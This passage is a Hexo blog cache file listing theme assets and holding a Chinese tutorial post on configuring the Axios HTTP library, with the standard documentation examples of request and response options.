{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/apollo/source/css/apollo.css","path":"css/apollo.css","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff","path":"font/sourcesanspro.woff","modified":0,"renderable":1},{"_id":"themes/apollo/source/scss/apollo.scss","path":"scss/apollo.scss","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","path":"font/sourcesanspro.woff2","modified":0,"renderable":1},{"_id":"themes/apollo/source/favicon.ico","path":"favicon.ico","modified":0,"renderable":1}],"Cache":[{"_id":"themes/apollo/.gitignore","hash":"a006beea0877a0aa3610ee00e73f62cb1d45125b","modified":1540447598000},{"_id":"themes/apollo/LICENSE","hash":"6e31ac9076bfc8f09ae47977419eee4edfb63e5b","modified":1540447598000},{"_id":"themes/apollo/README.md","hash":"201c76d030a98578ed5a6ad5c766a7bde91c32d3","modified":1540447598000},{"_id":"themes/apollo/_config.yml","hash":"e8413edb97ad4ec46c1ac5c5cd13ca344c9c411d","modified":1516699956000},{"_id":"themes/apollo/gulpfile.js","hash":"857a026b6643a2cd52c65d4ae0dc7fe9618206ee","modified":1540447598000},{"_id":"themes/apollo/package.json","hash":"eb1e76ec0b7ed6c6c7b2bd32b4f1e1bbe15800ca","modified":1540447598000},{"_id":"source/_posts/Axios使用说明.md","hash":"6c4149c7483a45298bfcfccf0045f3ea26f510f2","modified":1540447558000},{"_id":"source/_posts/EventEmitter.md","hash":"b39980dc6ac30af8f37707d378768394ce05aa89","modified":1540447558000},{"_id":"source/_posts/Javascript中那些你不知道的运算符.md","hash":"931eccf5e57ef8bfaf59f2e8ae2ae627aea0cac7","modified":1540447558000},{"_id":"source/_posts/React中的ref.md","hash":"6462e07cb6fd6b047354c093698a7da6f1ea0dcc","modified":1540447558000},{"_id":"source/_posts/Redux-reducer的优化写法.md","hash":"961e84ae7b621c01de423398a7aca32d956ad0ce","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（七）.md","hash":"daec3c7d4958e1831162b76a577c98713e9fb8b8","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（一）.md","hash":"de78dc465282765ae4cd4e6ebd6973a7c495e41a","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（三）.md","hash":"086a279ee27747de5e49a0affae7e01c6a706965","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（九）.md","hash":"cab1ff6fa6bedf4fd236411a64629d7a9aef9a9a","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（五）.md","hash":"c43d74b3b58cebe7caaf58cc776dc88efebb0374","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（八）.md","hash":"159c66e92ea6bcc746baefe4dfa632fa6b42b565","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（二）.md","hash":"169cfe1cfa5ba4ef53e0b37091f2b25d2ae617cc","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（六）.md","hash":"bde411930641ac810cc3c767a85e1bfe018acb3c","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（十）.md","hash":"0e580a62237aabaa327db2985477bb325cb588c9","modified":1540447558000},{"_id":"source/_posts/XSS和CSRF防御.md","hash":"823447b4667ecc2385e063bf235ee154b02989aa","modified":1540447558000},{"_id":"source/_posts/Typescript学习日记（四）.md","hash":"04c0186a3dfaee11d6c6beaa3a4c8dc3e7091dbe","modified":1540447558000},{"_id":"source/_posts/优化双重循环.md","hash":"8d3ea0679c311cf3cf36356f9e57f54b105dc560","modified":1540447558000},{"_id":"source/_posts/axios设置默认参数.md","hash":"babc459f289fe25319148a140067533c73700a55","modified":1540447558000},{"_id":"source/_posts/右键菜单.md","hash":"6d43dc8e52ecd17e37dae5941336f7a47019c5c2","modified":1540447558000},{"_id":"source/_posts/拖拽功能.md","hash":"fc8b868cff698bb66eeb11245dd280b94565bb26","modified":1540447558000},{"_id":"source/_posts/箭头函数.md","hash":"64b03ab527808851f3da7a5233ce4f0a2744ccb8","modified":1540447558000},{"_id":"themes/apollo/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1540447598000},{"_id":"source/_posts/逻辑符号.md","hash":"129fb26dabbb2893f58022d115ac61e5fa2127c5","modified":1540447558000},{"_id":"themes/apollo/.git/config","hash":"e8486e77527181934f2dda23e50b879ab7641244","modified":1540447598000},{"_id":"themes/apollo/.git/index","hash":"2bde1e33c452fbe8dc9277348e6a8d3b1ebca031","modified":1540447600000},{"_id":"source/_posts/现代浏览器的类名操作.md","hash":"8a0aefd3f90ba9dd379b52a7e171c0eba176a289","modified":1540447558000},{"_id":"themes/apollo/.git/packed-refs","hash":"959212f8fc97c44e0f461a8336bb6e652ddde7a6","modified":1540447598000},{"_id":"themes/apollo/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1540447586000},{"_id":"themes/apollo/languages/en.yml","hash":"40292f2a48e4e6361132033a47c516cb33127b6c","modified":1512199527000},{"_id":"themes/apollo/languages/zh-cn.yml","hash":"9e4b03e14c094000257ea254fd660dde4c7af63c","modified":1512199527000},{"_id":"themes/apollo/doc/doc-en.md","hash":"409e931a444c02a57b64a0a44dde6e66c1881ca0","modified":1540447598000},{"_id":"themes/apollo/doc/doc-zh.md","hash":"2a6a81840cdaf497969268a12d8f62c98cc38103","modified":1540447598000},{"_id":"themes/apollo/layout/archive.jade","hash":"62797414355bf4474092bc3a32726c8340820ffb","modified":1540447598000},{"_id":"themes/apollo/layout/index.jade","hash":"55f2f1b4b5364a0e09cb18e1112664c6415fb881","modified":1540447598000},{"_id":"themes/apollo/layout/post.jade","hash":"245c26244c075c3632d1545c3b228ee9d112f15d","modified":1540447598000},{"_id":"themes/apollo/source/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1540447598000},{"_id":"themes/apollo/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1540447586000},{"_id":"themes/apollo/.git/logs/HEAD","hash":"137e880c1f01d9d0e52a91dae959cc1d999b0954","modified":1540447598000},{"_id":"themes/apollo/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/pre-push.sample","hash":"5c8518bfd1d1d3d2c1a7194994c0a16d8a313a41","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/pre-rebase.sample","hash":"18be3eb275c1decd3614e139f5a311b75f1b0ab8","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/pre-receive.sample","hash":"705a17d259e7896f0082fe2e9f2c0c3b127be5ac","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1540447586000},{"_id":"themes/apollo/.git/hooks/update.sample","hash":"e729cd61b27c128951d139de8e7c63d1a3758dde","modified":1540447586000},{"_id":"themes/apollo/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1540447586000},{"_id":"themes/apollo/layout/mixins/paginator.jade","hash":"f4ee2fb61a32e199b48cf93771749edc8a007391","modified":1540447598000},{"_id":"themes/apollo/layout/mixins/post.jade","hash":"cd9447e9b0ad22213e6a17d9a9b948f9f998f921","modified":1512199527000},{"_id":"themes/apollo/layout/partial/comment.jade","hash":"ff0a2c269c2434da2ac5529872f1d6184a71f96d","modified":1540447598000},{"_id":"themes/apollo/layout/partial/head.jade","hash":"43d2db73f0247a9a3ed00ecb95b537a872b7201a","modified":1540447598000},{"_id":"themes/apollo/layout/partial/copyright.jade","hash":"0c85dc2d9d697d92e44d1bad84f820d7722fa52f","modified":1540448341000},{"_id":"themes/apollo/layout/partial/layout.jade","hash":"76b7c051533333bf5b8084c3d5842418c0f7690e","modified":1540448428000},{"_id":"themes/apollo/layout/partial/nav.jade","hash":"f4842d9d3d763fbb823d112a6f49f24cc42a0ad4","modified":1540447598000},{"_id":"themes/apollo/layout/partial/scripts.jade","hash":"5be3cf84e08580c47b5ee5dde670c50acdab9ea6","modified":1540448508000},{"_id":"themes/apollo/source/css/apollo.css","hash":"e07a11a5da5fc097f023e06a85575356066afd09","modified":1540447598000},{"_id":"themes/apollo/source/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1540447598000},{"_id":"themes/apollo/source/scss/apollo.scss","hash":"e0092f469264b55b25e0d441274f1c812147e7d1","modified":1540447598000},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1540447598000},{"_id":"themes/apollo/.git/refs/heads/master","hash":"bb45244afa960985b39f4bb9b86f3b4430f210ba","modified":1540447598000},{"_id":"themes/apollo/.git/objects/pack/pack-706d5087538f3017ae88501401c9ceeea89a09a9.idx","hash":"56faa98ecad8297ca8eaa489ee8ef98385afa639","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/archive-post-list.scss","hash":"d2f740a7d48349b7536777c795f82ab740836d0f","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/copyright.scss","hash":"1309667e3000037170cfbb5b8c9c65f4ffcf6814","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/base.scss","hash":"ae967b2049ecb9b8c4e139ecce32fd9fb5358ac5","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/footer.scss","hash":"094aca6e52f11b139ac7980ca03fa7b9d8fc7b2f","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/header.scss","hash":"153bde88bf8ffeae4ffd813d8cc694dd83d33d94","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/home-post-list.scss","hash":"6b5c59f3d2295944f934aee2c1156012a3306d5d","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/mq.scss","hash":"fc5dda52cfbb10e27e2471e03f4606fb3d588225","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/normalize.scss","hash":"fd0b27bed6f103ea95b08f698ea663ff576dbcf1","modified":1540447598000},{"_id":"themes/apollo/source/scss/_partial/post.scss","hash":"1998f207541a2590a5624549f96c5e65d136690a","modified":1540447598000},{"_id":"themes/apollo/.git/logs/refs/heads/master","hash":"137e880c1f01d9d0e52a91dae959cc1d999b0954","modified":1540447598000},{"_id":"themes/apollo/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1540447598000},{"_id":"themes/apollo/.git/logs/refs/remotes/origin/HEAD","hash":"137e880c1f01d9d0e52a91dae959cc1d999b0954","modified":1540447598000},{"_id":"themes/apollo/.git/objects/pack/pack-706d5087538f3017ae88501401c9ceeea89a09a9.pack","hash":"6bd7cbc66d2a5af253c052f8da76afb371a97e39","modified":1540447598000},{"_id":"themes/apollo/.DS_Store","hash":"100029d9a923faf8b4d565b91edb03eeae6ee3a4","modified":1540447949000},{"_id":"themes/apollo/source/favicon.ico","hash":"cd51ad6a79d261a51af4b76bf3a9054137255c6c","modified":1513062892000},{"_id":"themes/apollo/source/.DS_Store","hash":"1a67a8c8d0bbbe8b45722439afaebc9f1498cd0e","modified":1513062938000}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Axios使用说明","date":"2016-10-20T01:41:40.000Z","_content":"Axios是近年来备受推崇的一个网络请求库，它以基于Promise的方式封装了浏览器的XMLHttpRequest和服务器端node http请求，使得我们可以用es6推荐的异步方式处理网络请求。\n<!-- more -->\n\n### 为什么用Axios\n> 官方是这样介绍的：\n* 从浏览器创建XMLHttpRequest\n* 从node.js创建http请求\n* 支持Promise API\n* 转换请求与响应数据\n* 取消请求\n* 自动转换JSON数据\n* 支持客户端XSRF攻击防护\n\n扩展了诸多功能之后 `axios.min.js` 文件最终打包出来大小仅有 `13kb`。\n\n### 配置说明\n官方给出了一份详尽的配置说明，供使用者自定义自己的使用方式。详情可以点击[这里](https://github.com/axios/axios)。\n#### 全局默认配置\n\n`axios` 给出了3个全局的配置信息，如下：\n```js\naxios.defaults.baseURL = 'https://api.example.com';\naxios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\naxios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n```\n\n**baseURL**\n代表请求的地址，类似于 `host`。比如：\n```js\nvar baseUrl = 'https://api.github.com'\naxios.defaults.baseURL = baseUrl;\naxios.get('/user')\n    .then(res => {\n        console.log(res)\n    })\n// ------------ 与上面的写法作用相同 --------------//\naxios.get('https://api.github.com/user')\n    .then(res => {\n        console.log(res)\n    })\n```\n通过配置 `baseUrl` 可以简化请求地址。\n\n**Authorization**\n授权信息，一般用于用户验证。如果没有设置，则请求是不会携带 `Authorization` 信息。\n\n**Content-Type**\n请求默认的 `Content-Type` 设置为 `application/x-www-form-urlencoded`，可以在全局更改，也可以在 `拦截器` 和 `请求/响应预处理` 中设置(后文中会细说)。\n\n#### 请求默认配置\n\n```js\n{\n  url: '/user',\n\n  method: 'get', // default\n\n  baseURL: 'https://some-domain.com/api/',\n\n  transformRequest: [function (data, headers) {\n\n    return data;\n  }],\n\n  transformResponse: [function (data) {\n\n    return data;\n  }],\n\n  headers: {'X-Requested-With': 'XMLHttpRequest'},\n\n  params: {\n    ID: 12345\n  },\n\n  paramsSerializer: function(params) {\n    return Qs.stringify(params, {arrayFormat: 'brackets'})\n  },\n\n  data: {\n    firstName: 'Fred'\n  },\n\n  timeout: 1000,\n\n  withCredentials: false, // default\n\n  adapter: function (config) {\n    /* ... */\n  },\n\n  auth: {\n    username: 'janedoe',\n    password: 's00pers3cret'\n  },\n\n  responseType: 'json', // default\n\n  xsrfCookieName: 'XSRF-TOKEN', // default\n\n  xsrfHeaderName: 'X-XSRF-TOKEN', // default\n\n  onUploadProgress: function (progressEvent) {\n\n  },\n\n  onDownloadProgress: function (progressEvent) {\n\n  },\n\n  maxContentLength: 2000,\n\n  validateStatus: function (status) {\n    return status >= 200 && status < 300; // default\n  },\n\n  maxRedirects: 5, // default\n\n  httpAgent: new http.Agent({ keepAlive: true }),\n  httpsAgent: new https.Agent({ keepAlive: true }),\n\n  proxy: {\n    host: '127.0.0.1',\n    port: 9000,\n    auth: {\n      username: 'mikeymike',\n      password: 'rapunz3l'\n    }\n  },\n\n  cancelToken: new CancelToken(function (cancel) {\n\n  })\n}\n\n```\n最常用的也就是前面的 `10` 个配置，而且意思都特别容易理解。\n具体的用法可以参考[官方说明](https://github.com/axios/axios)和[examples](https://github.com/axios/axios/tree/master/examples)。\n\n#### 返回体\n```js\n{\n  data: {}, // 服务端对于请求返回的具体信息\n\n  status: 200,// 服务端 http 的状态码\n\n  statusText: 'OK', // 服务端 http 文本的响应状态\n\n  headers: {}, // 响应头部\n\n  config: {}, // axios 请求时的配置信息\n\n  request: {} // 请求的详细信息(XMLHttpRequest)\n}\n```\n\n由于内容实在太多，本文暂时就讲这么多。其它关于 `axios` 的方法的用法和说明都会在后文中讲解。","source":"_posts/Axios使用说明.md","raw":"---\ntitle: Axios使用说明\ndate: 2016-10-20 09:41:40\ntags:\n---\nAxios是近年来备受推崇的一个网络请求库，它以基于Promise的方式封装了浏览器的XMLHttpRequest和服务器端node http请求，使得我们可以用es6推荐的异步方式处理网络请求。\n<!-- more -->\n\n### 为什么用Axios\n> 官方是这样介绍的：\n* 从浏览器创建XMLHttpRequest\n* 从node.js创建http请求\n* 支持Promise API\n* 转换请求与响应数据\n* 取消请求\n* 自动转换JSON数据\n* 支持客户端XSRF攻击防护\n\n扩展了诸多功能之后 `axios.min.js` 文件最终打包出来大小仅有 `13kb`。\n\n### 配置说明\n官方给出了一份详尽的配置说明，供使用者自定义自己的使用方式。详情可以点击[这里](https://github.com/axios/axios)。\n#### 全局默认配置\n\n`axios` 给出了3个全局的配置信息，如下：\n```js\naxios.defaults.baseURL = 'https://api.example.com';\naxios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\naxios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n```\n\n**baseURL**\n代表请求的地址，类似于 `host`。比如：\n```js\nvar baseUrl = 'https://api.github.com'\naxios.defaults.baseURL = baseUrl;\naxios.get('/user')\n    .then(res => {\n        console.log(res)\n    })\n// ------------ 与上面的写法作用相同 --------------//\naxios.get('https://api.github.com/user')\n    .then(res => {\n        console.log(res)\n    })\n```\n通过配置 `baseUrl` 可以简化请求地址。\n\n**Authorization**\n授权信息，一般用于用户验证。如果没有设置，则请求是不会携带 `Authorization` 信息。\n\n**Content-Type**\n请求默认的 `Content-Type` 设置为 `application/x-www-form-urlencoded`，可以在全局更改，也可以在 `拦截器` 和 `请求/响应预处理` 中设置(后文中会细说)。\n\n#### 请求默认配置\n\n```js\n{\n  url: '/user',\n\n  method: 'get', // default\n\n  baseURL: 'https://some-domain.com/api/',\n\n  transformRequest: [function (data, headers) {\n\n    return data;\n  }],\n\n  transformResponse: [function (data) {\n\n    return data;\n  }],\n\n  headers: {'X-Requested-With': 'XMLHttpRequest'},\n\n  params: {\n    ID: 12345\n  },\n\n  paramsSerializer: function(params) {\n    return Qs.stringify(params, {arrayFormat: 'brackets'})\n  },\n\n  data: {\n    firstName: 'Fred'\n  },\n\n  timeout: 1000,\n\n  withCredentials: false, // default\n\n  adapter: function (config) {\n    /* ... */\n  },\n\n  auth: {\n    username: 'janedoe',\n    password: 's00pers3cret'\n  },\n\n  responseType: 'json', // default\n\n  xsrfCookieName: 'XSRF-TOKEN', // default\n\n  xsrfHeaderName: 'X-XSRF-TOKEN', // default\n\n  onUploadProgress: function (progressEvent) {\n\n  },\n\n  onDownloadProgress: function (progressEvent) {\n\n  },\n\n  maxContentLength: 2000,\n\n  validateStatus: function (status) {\n    return status >= 200 && status < 300; // default\n  },\n\n  maxRedirects: 5, // default\n\n  httpAgent: new http.Agent({ keepAlive: true }),\n  httpsAgent: new https.Agent({ keepAlive: true }),\n\n  proxy: {\n    host: '127.0.0.1',\n    port: 9000,\n    auth: {\n      username: 'mikeymike',\n      password: 'rapunz3l'\n    }\n  },\n\n  cancelToken: new CancelToken(function (cancel) {\n\n  })\n}\n\n```\n最常用的也就是前面的 `10` 个配置，而且意思都特别容易理解。\n具体的用法可以参考[官方说明](https://github.com/axios/axios)和[examples](https://github.com/axios/axios/tree/master/examples)。\n\n#### 返回体\n```js\n{\n  data: {}, // 服务端对于请求返回的具体信息\n\n  status: 200,// 服务端 http 的状态码\n\n  statusText: 'OK', // 服务端 http 文本的响应状态\n\n  headers: {}, // 响应头部\n\n  config: {}, // axios 请求时的配置信息\n\n  request: {} // 请求的详细信息(XMLHttpRequest)\n}\n```\n\n由于内容实在太多，本文暂时就讲这么多。其它关于 `axios` 的方法的用法和说明都会在后文中讲解。","slug":"Axios使用说明","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7q7000002vsjl6ba3cl","content":"<p>Axios是近年来备受推崇的一个网络请求库，它以基于Promise的方式封装了浏览器的XMLHttpRequest和服务器端node http请求，使得我们可以用es6推荐的异步方式处理网络请求。<br><a id=\"more\"></a></p>\n<h3 id=\"为什么用Axios\"><a href=\"#为什么用Axios\" class=\"headerlink\" title=\"为什么用Axios\"></a>为什么用Axios</h3><blockquote>\n<p>官方是这样介绍的：</p>\n<ul>\n<li>从浏览器创建XMLHttpRequest</li>\n<li>从node.js创建http请求</li>\n<li>支持Promise API</li>\n<li>转换请求与响应数据</li>\n<li>取消请求</li>\n<li>自动转换JSON数据</li>\n<li>支持客户端XSRF攻击防护</li>\n</ul>\n</blockquote>\n<p>扩展了诸多功能之后 <code>axios.min.js</code> 文件最终打包出来大小仅有 <code>13kb</code>。</p>\n<h3 id=\"配置说明\"><a href=\"#配置说明\" class=\"headerlink\" title=\"配置说明\"></a>配置说明</h3><p>官方给出了一份详尽的配置说明，供使用者自定义自己的使用方式。详情可以点击<a href=\"https://github.com/axios/axios\">这里</a>。</p>\n<h4 id=\"全局默认配置\"><a href=\"#全局默认配置\" class=\"headerlink\" title=\"全局默认配置\"></a>全局默认配置</h4><p><code>axios</code> 给出了3个全局的配置信息，如下：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.defaults.baseURL = <span class=\"string\">'https://api.example.com'</span>;</span><br><span class=\"line\">axios.defaults.headers.common[<span class=\"string\">'Authorization'</span>] = AUTH_TOKEN;</span><br><span class=\"line\">axios.defaults.headers.post[<span class=\"string\">'Content-Type'</span>] = <span class=\"string\">'application/x-www-form-urlencoded'</span>;</span><br></pre></td></tr></table></figure></p>\n<p><strong>baseURL</strong><br>代表请求的地址，类似于 <code>host</code>。比如：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> baseUrl = <span class=\"string\">'https://api.github.com'</span></span><br><span class=\"line\">axios.defaults.baseURL = baseUrl;</span><br><span class=\"line\">axios.get(<span class=\"string\">'/user'</span>)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"comment\">// ------------ 与上面的写法作用相同 --------------//</span></span><br><span class=\"line\">axios.get(<span class=\"string\">'https://api.github.com/user'</span>)</span><br><span class=\"line\">    .then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">    &#125;)</span><br></pre></td></tr></table></figure></p>\n<p>通过配置 <code>baseUrl</code> 可以简化请求地址。</p>\n<p><strong>Authorization</strong><br>授权信息，一般用于用户验证。如果没有设置，则请求是不会携带 <code>Authorization</code> 信息。</p>\n<p><strong>Content-Type</strong><br>请求默认的 <code>Content-Type</code> 设置为 <code>application/x-www-form-urlencoded</code>，可以在全局更改，也可以在 <code>拦截器</code> 和 <code>请求/响应预处理</code> 中设置(后文中会细说)。</p>\n<h4 id=\"请求默认配置\"><a href=\"#请求默认配置\" class=\"headerlink\" title=\"请求默认配置\"></a>请求默认配置</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  url: <span class=\"string\">'/user'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  method: <span class=\"string\">'get'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://some-domain.com/api/'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  transformRequest: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data, headers</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  transformResponse: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  headers: &#123;<span class=\"string\">'X-Requested-With'</span>: <span class=\"string\">'XMLHttpRequest'</span>&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  params: &#123;</span><br><span class=\"line\">    ID: <span class=\"number\">12345</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  paramsSerializer: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Qs.stringify(params, &#123;<span class=\"attr\">arrayFormat</span>: <span class=\"string\">'brackets'</span>&#125;)</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    firstName: <span class=\"string\">'Fred'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  timeout: <span class=\"number\">1000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">false</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  adapter: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">config</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... */</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  auth: &#123;</span><br><span class=\"line\">    username: <span class=\"string\">'janedoe'</span>,</span><br><span class=\"line\">    password: <span class=\"string\">'s00pers3cret'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  responseType: <span class=\"string\">'json'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  xsrfCookieName: <span class=\"string\">'XSRF-TOKEN'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  xsrfHeaderName: <span class=\"string\">'X-XSRF-TOKEN'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  onUploadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  onDownloadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  maxContentLength: <span class=\"number\">2000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  validateStatus: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status &gt;= <span class=\"number\">200</span> &amp;&amp; status &lt; <span class=\"number\">300</span>; <span class=\"comment\">// default</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  maxRedirects: <span class=\"number\">5</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  httpAgent: <span class=\"keyword\">new</span> http.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\">  httpsAgent: <span class=\"keyword\">new</span> https.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\"></span><br><span class=\"line\">  proxy: 